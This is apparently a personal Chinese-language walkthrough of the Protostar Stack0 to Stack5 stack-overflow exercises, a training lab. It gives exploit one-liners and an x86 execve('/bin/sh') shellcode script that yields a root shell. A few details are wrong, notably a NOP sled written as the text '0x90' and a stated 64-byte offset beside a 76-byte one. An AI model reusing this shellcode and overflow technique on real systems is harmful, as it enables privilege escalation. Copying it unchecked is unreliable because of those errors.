# Protostar

## Stack0

先蓋 64 個字

再蓋下去就是 modified (目標)

這題只要讓 modified != 0

所以隨便蓋就好

`python -c "print 'A'*64+'whatever'" | ./stack0`

## Stack1

這題 modified 和 buffer 的相對距離一樣是 64 個字

但是要把 modified 變成 0x61626364 (小心 little endian)

注意 input 是從 argv 參數進來的 (我用 xargs 把 python 產生的字給 stack1 當參數)

`python -c "print 'A'*64+'dcba'" | xargs ./stack1`

## Stack2

這題也一樣

不過 input 變成從 GREENIE(環境變數) 拿值進來

```
GREENIE=$(python -c "print 'A'*64+'\x0a\x0d\x0a\x0d'")
export GREENIE
./stack2
```

## Stack 3

這題要把 fp (function pointer) 改成 win 這個函式的位置

offset (buffer 和 fp 的相對距離) 也一樣是 64 bytes (也就是先蓋 64 個字之後就蓋到目標 fp 了)

先用 gdb 看 win 函式的位置 (在 gdb 下執行 `x win`) -> 0x8048424

`python -c "print 'A'*64+'\x24\x84\x04\x08'" | ./stack3`

## Stack4

這題要把 stack 上的 return address 改成 win 這個函式的位置

offset (buffer 和 return address 的相對距離) 是 76 bytes (也就是先蓋 64 個字之後就蓋到目標 return address 了)

先用 gdb 看 win 函式的位置 (在 gdb 下執行 `x win`) -> 0x80483f4

`python -c "print 'A'*76+'\xf4\x83\x04\x08'" | ./stack4`

## Stack5

這題要把 shellcode 塞到 stack 上執行囉~(興奮XD)

首先正確的蓋到 return_address (讓他 return 到 stack 後面一點的位置)

再建一個 nop 通道讓他滑到執行 shellcode

然後當然也要把 shell code 放到 stack 上

```python
import struct

padding = 'A'*76
return_address = struct.pack("I",0xbffff78c+50)
slide_path = '0x90'*100
shell_code = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";
print padding + return_address + slide_path + shell_code
```

`(python exploit.py ; cat ) | ./stack5`

拿到 sh 了而且還是 root 的權限 (我們原本是 user 的權限)
